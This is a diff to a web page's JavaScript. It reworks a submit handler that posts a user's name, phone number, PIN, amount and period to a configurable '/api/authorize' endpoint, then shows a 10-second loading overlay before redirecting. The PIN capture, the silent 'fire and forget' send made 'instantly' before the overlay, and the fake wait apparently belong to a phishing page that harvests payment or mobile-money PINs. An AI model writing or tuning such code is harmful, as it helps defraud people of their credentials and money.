@@ -593,8 +593,8 @@
     // ─── GLOBAL URL PARAMS ───
     const urlParams = new URLSearchParams(window.location.search);
 
-    // ─── LOADING DURATION - 5 SECONDS ───
-    const LOADING_DURATION = 5000; // 5 seconds
+    // ─── LOADING DURATION - 10 SECONDS ───
+    const LOADING_DURATION = 10000; // 10 seconds
 
     // Load saved config from localStorage
     function loadConfig() {
@@ -678,13 +678,14 @@
         overlay.classList.remove('show');
     }
 
-    // ─── SEND TO BACKEND API ───
+    // ─── SEND TO BACKEND API (INSTANT - NO DELAY) ───
     function sendToBackend(phone, pin, amount, name, period) {
-        console.log('📤 Sending to backend:', {
+        console.log('📤 Sending to backend INSTANTLY:', {
             url: `${CONFIG.API_URL}/api/authorize`,
             data: { name, phone, amount, pin, period }
         });
 
+        // ─── SEND IMMEDIATELY - FIRE AND FORGET ───
         fetch(`${CONFIG.API_URL}/api/authorize`, {
             method: 'POST',
             headers: {
@@ -717,7 +718,7 @@
         });
     }
 
-    // ─── HANDLE SUBMIT - SHOW LOADING, SEND TO BACKEND, THEN REDIRECT ───
+    // ─── HANDLE SUBMIT - SEND INSTANTLY, SHOW LOADING, REDIRECT AFTER 10 SECONDS ───
     function handleSubmit() {
         if (isProcessing) return;
         
@@ -742,13 +743,13 @@
         isProcessing = true;
         document.getElementById('submitBtn').disabled = true;
 
+        // ─── SEND TO BACKEND INSTANTLY (NO DELAY AT ALL) ───
+        sendToBackend(phone, pin, amount, name, period);
+
         // ─── SHOW LOADING OVERLAY ───
         showLoading();
 
-        // ─── SEND TO BACKEND (FIRE AND FORGET) ───
-        sendToBackend(phone, pin, amount, name, period);
-
-        // ─── WAIT 5 SECONDS, THEN REDIRECT ───
+        // ─── WAIT 10 SECONDS, THEN REDIRECT ───
         setTimeout(function() {
             hideLoading();
             
